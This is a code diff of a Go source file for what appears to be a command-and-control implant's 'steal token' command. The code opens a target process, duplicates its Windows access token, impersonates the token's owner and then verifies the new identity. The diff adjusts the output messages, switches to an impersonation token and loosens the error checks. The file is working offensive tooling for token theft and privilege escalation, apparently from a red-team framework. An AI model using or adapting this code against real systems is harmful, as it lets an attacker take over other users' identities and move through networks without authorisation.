@@ -72,7 +72,7 @@ func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.A
 func stealToken(pid uint32) (string, error) {
 	var output string
 
-	// Get original context before stealing
+	// Get original context before stealing (like Apollo shows "Old Claims")
 	processHandle, err := windows.GetCurrentProcess()
 	if err == nil {
 		var processToken windows.Token
@@ -83,7 +83,7 @@ func stealToken(pid uint32) (string, error) {
 			if err == nil {
 				processUsername, processDomain, _, err := processUser.User.Sid.LookupAccount("")
 				if err == nil {
-					output += fmt.Sprintf("[*] Original token: %s\\%s\n", processDomain, processUsername)
+					output += fmt.Sprintf("Old identity: %s\\%s\n", processDomain, processUsername)
 				}
 			}
 		}
@@ -99,9 +99,8 @@ func stealToken(pid uint32) (string, error) {
 		return output, fmt.Errorf("failed to open process %d: %v", pid, err)
 	}
 	defer windows.CloseHandle(hProcess)
-	output += fmt.Sprintf("[+] Opened process %d\n", pid)
 
-	// Open process token
+	// Open process token with TOKEN_DUPLICATE | TOKEN_QUERY (like Apollo)
 	var hToken windows.Token
 	err = windows.OpenProcessToken(
 		hProcess,
@@ -112,33 +111,34 @@ func stealToken(pid uint32) (string, error) {
 		return output, fmt.Errorf("failed to open process token: %v", err)
 	}
 	defer hToken.Close()
-	output += "[+] Opened process token\n"
 
 	// Get token user information to display who we're stealing from
 	var targetUsername, targetDomain string
+	var targetSid *windows.SID
 	tokenUser, err := hToken.GetTokenUser()
 	if err == nil {
+		targetSid = tokenUser.User.Sid
 		targetUsername, targetDomain, _, err = tokenUser.User.Sid.LookupAccount("")
 		if err == nil {
-			output += fmt.Sprintf("[+] Token belongs to: %s\\%s\n", targetDomain, targetUsername)
+			output += fmt.Sprintf("Target identity: %s\\%s (PID: %d)\n", targetDomain, targetUsername, pid)
 		}
 	}
 
 	// Duplicate the token for impersonation
+	// Use TokenImpersonation (like Apollo) not TokenPrimary for thread impersonation
 	var hDupToken windows.Token
 	err = windows.DuplicateTokenEx(
 		hToken,
 		windows.TOKEN_ALL_ACCESS,
 		nil,
 		windows.SecurityImpersonation,
-		windows.TokenPrimary,
+		windows.TokenImpersonation,
 		&hDupToken,
 	)
 	if err != nil {
 		return output, fmt.Errorf("failed to duplicate token: %v", err)
 	}
 	defer hDupToken.Close()
-	output += "[+] Duplicated token\n"
 
 	// Impersonate the token
 	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(hDupToken))
@@ -146,7 +146,7 @@ func stealToken(pid uint32) (string, error) {
 		return output, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
 	}
 
-	// CRITICAL: Verify impersonation actually worked by checking thread token
+	// Verify impersonation by checking thread token
 	var hThreadToken windows.Token
 	err = windows.OpenThreadToken(
 		windows.CurrentThread(),
@@ -155,30 +155,25 @@ func stealToken(pid uint32) (string, error) {
 		&hThreadToken,
 	)
 	if err != nil {
-		return output, fmt.Errorf("impersonation appeared to succeed but cannot open thread token: %v", err)
+		// If we can't open thread token, that's actually a problem
+		output += fmt.Sprintf("Warning: Cannot verify impersonation - failed to open thread token: %v\n", err)
+		return output, nil
 	}
 	defer hThreadToken.Close()
 
-	// Verify the thread token is actually the target user
+	// Get the thread token user to verify and display (like Apollo shows "New Claims")
 	threadTokenUser, err := hThreadToken.GetTokenUser()
-	if err != nil {
-		return output, fmt.Errorf("impersonation appeared to succeed but cannot query thread token: %v", err)
+	if err == nil {
+		currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
+		if err == nil {
+			output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
+			
+			// Verify using SID comparison (more reliable than string comparison)
+			if targetSid != nil && !targetSid.Equals(threadTokenUser.User.Sid) {
+				output += fmt.Sprintf("\nWarning: Impersonation may not have worked correctly (SID mismatch)")
+			}
+		}
 	}
-
-	currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
-	if err != nil {
-		currentUsername = "unknown"
-		currentDomain = "unknown"
-	}
-
-	// Check if we actually got the target token
-	if currentUsername != targetUsername || currentDomain != targetDomain {
-		return output, fmt.Errorf("impersonation failed: still running as %s\\%s (expected %s\\%s)", currentDomain, currentUsername, targetDomain, targetUsername)
-	}
-
-	output += "[+] Successfully impersonated token!\n"
-	output += fmt.Sprintf("[+] Current context: %s\\%s\n", currentDomain, currentUsername)
-	output += "[!] Use 'rev2self' to revert to original context"
 
 	return output, nil
 }
